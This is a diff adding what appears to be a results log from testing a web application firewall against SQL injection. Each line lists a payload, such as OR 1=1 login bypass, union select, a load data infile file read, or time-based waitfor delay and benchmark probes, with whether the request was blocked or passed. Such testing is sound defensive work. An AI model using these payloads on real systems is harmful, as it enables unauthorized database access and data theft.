@@ -1,0 +1,564 @@
+{"payload": "<username>' OR 1=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.009414625994395465}
+{"payload": "'OR '' = '", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035195560049032792}
+{"payload": "<username>'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004366901994217187}
+{"payload": "' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004232223000144586}
+{"payload": "'OR 1=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003844525999738835}
+{"payload": "create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003736885992111638}
+{"payload": ")%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004287192990886979}
+{"payload": ")%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038413099973695353}
+{"payload": "')%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003416634994209744}
+{"payload": "')%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003739421008503996}
+{"payload": "\")%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005379934009397402}
+{"payload": "\")%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004496588997426443}
+{"payload": "))%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033912969956872985}
+{"payload": "))%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005657621004502289}
+{"payload": "'))%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006646950001595542}
+{"payload": "'))%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004729050997411832}
+{"payload": "\"))%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005017520001274534}
+{"payload": "\"))%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005230433991528116}
+{"payload": ",NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005252203991403803}
+{"payload": ",NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037560839991783723}
+{"payload": "',NULL)%20waifor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016858072005561553}
+{"payload": "',NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005194814002607018}
+{"payload": "\",NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005003283004043624}
+{"payload": "\",NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004179815005045384}
+{"payload": "),NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004506889992626384}
+{"payload": "),NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005673832012689672}
+{"payload": "'),NULL)%20waifor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012901538997539319}
+{"payload": "'),NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005962062990874983}
+{"payload": "\"),NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005133433995069936}
+{"payload": "\"),NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005153153993887827}
+{"payload": ",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004689051987952553}
+{"payload": ",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004718942000181414}
+{"payload": "',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004611764001310803}
+{"payload": "',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005835785996168852}
+{"payload": "\",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004701462996308692}
+{"payload": "\",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038468090060632676}
+{"payload": "),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004993268012185581}
+{"payload": "),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004036608006572351}
+{"payload": "'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004452052002307028}
+{"payload": "'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004811140999663621}
+{"payload": "\"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004731855995487422}
+{"payload": "\"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004454889000044204}
+{"payload": ",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038764880009694025}
+{"payload": ",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00476732398965396}
+{"payload": "',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004376768003567122}
+{"payload": "',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004789447993971407}
+{"payload": "\",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004676885000662878}
+{"payload": "\",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004749115993035957}
+{"payload": "),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00452834099996835}
+{"payload": "),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004245383010129444}
+{"payload": "'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004934248994686641}
+{"payload": "'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004963785002473742}
+{"payload": "\"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004265862997272052}
+{"payload": "\"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00661898500402458}
+{"payload": ",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007192198987468146}
+{"payload": ",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0051193920080550015}
+{"payload": "',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005736120001529343}
+{"payload": "',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005900802003452554}
+{"payload": "\",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005463975991006009}
+{"payload": "\",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005509662994882092}
+{"payload": "),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0045470790064428}
+{"payload": "),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004704652994405478}
+{"payload": "'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005765134992543608}
+{"payload": "'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004973420989699662}
+{"payload": "\"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005924568002228625}
+{"payload": "\"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004819776993826963}
+{"payload": ",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004419227989274077}
+{"payload": ",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006464085992774926}
+{"payload": "',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0047793479898246005}
+{"payload": "',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0051127049955539405}
+{"payload": "\",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00364925799658522}
+{"payload": "\",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036783219984499738}
+{"payload": "),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004189295010291971}
+{"payload": "),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003847992993541993}
+{"payload": "'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003261203004512936}
+{"payload": "'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033870289917103946}
+{"payload": "\"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003956728003686294}
+{"payload": "\"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036743390082847327}
+{"payload": ",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003711265992023982}
+{"payload": "',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034643990074982867}
+{"payload": "',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003768939001020044}
+{"payload": "\",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004107934990315698}
+{"payload": "\",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003481110994471237}
+{"payload": "),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003352651998284273}
+{"payload": "),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035111280012642965}
+{"payload": "'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003290831999038346}
+{"payload": "'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035935689957113937}
+{"payload": "\"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036493809893727303}
+{"payload": "\"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003381232003448531}
+{"payload": ",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032648159976815805}
+{"payload": ",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033047239994630218}
+{"payload": "',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034104630030924454}
+{"payload": "',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032642909936839715}
+{"payload": "\",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033494159870315343}
+{"payload": "\",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003348653990542516}
+{"payload": "),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003438307991018519}
+{"payload": "),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032882069936022162}
+{"payload": "'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003300861004390754}
+{"payload": "'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032405840029241517}
+{"payload": "\"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003773443997488357}
+{"payload": "\"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004016324004624039}
+{"payload": ",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003608697996241972}
+{"payload": ",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032010480063036084}
+{"payload": "',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032807370007503778}
+{"payload": "',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003945135002140887}
+{"payload": "\",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005465289010317065}
+{"payload": "\",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004118017008295283}
+{"payload": "),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035002070071641356}
+{"payload": "),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036732940061483532}
+{"payload": "'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004474202010896988}
+{"payload": "'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034911190014099702}
+{"payload": "\"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003498229998513125}
+{"payload": "\"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036029780021635816}
+{"payload": "waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033525909966556355}
+{"payload": "waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034894070122390985}
+{"payload": "' waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031325250020017847}
+{"payload": "' waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034491190017433837}
+{"payload": "\" waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004006458999356255}
+{"payload": "\" waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003791733004618436}
+{"payload": ") waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003558080003131181}
+{"payload": ") waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003749789990251884}
+{"payload": ")) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004727940002339892}
+{"payload": ")) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004080362996319309}
+{"payload": "))) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038610970077570528}
+{"payload": "))) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003890014995704405}
+{"payload": ")))) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004218771995510906}
+{"payload": ")))) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00415008699928876}
+{"payload": "))))) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038688630011165515}
+{"payload": ")))))) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037080110050737858}
+{"payload": "') waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00401441399299074}
+{"payload": "') waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004262907008524053}
+{"payload": "\") waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003802945007919334}
+{"payload": "\") waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004075613003806211}
+{"payload": "')) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037669660086976364}
+{"payload": "')) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00401732099999208}
+{"payload": "\")) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004052688003866933}
+{"payload": "\")) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003781232997425832}
+{"payload": "'))) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003892960012308322}
+{"payload": "'))) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038132039917400107}
+{"payload": "\"))) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0041483750101178885}
+{"payload": "\"))) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036860890104435384}
+{"payload": "')))) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003913478009053506}
+{"payload": "')))) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038817879976704717}
+{"payload": "\")))) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003561306992196478}
+{"payload": "\")))) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00396210300095845}
+{"payload": "'))))) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003625661993282847}
+{"payload": "'))))) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003583219993743114}
+{"payload": "\"))))) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00529111000651028}
+{"payload": "\"))))) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008291510006529279}
+{"payload": "')))))) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007737193998764269}
+{"payload": "')))))) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0046137870085658506}
+{"payload": "\")))))) waitfor delay '0:0:20' /*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005495707009686157}
+{"payload": "\")))))) waitfor delay '0:0:20' --", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004659897007513791}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005447051997180097}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004059603001223877}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037495359865715727}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004967348009813577}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006550753998453729}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007147140000597574}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008666626003105193}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006188430998008698}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006448524000006728}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00605557399103418}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00608924801053945}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006693670991808176}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005971835998934694}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007449472002917901}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006561312999110669}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006006208001053892}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005816164004500024}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004214347995002754}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004320478008594364}
+{"payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005591793989879079}
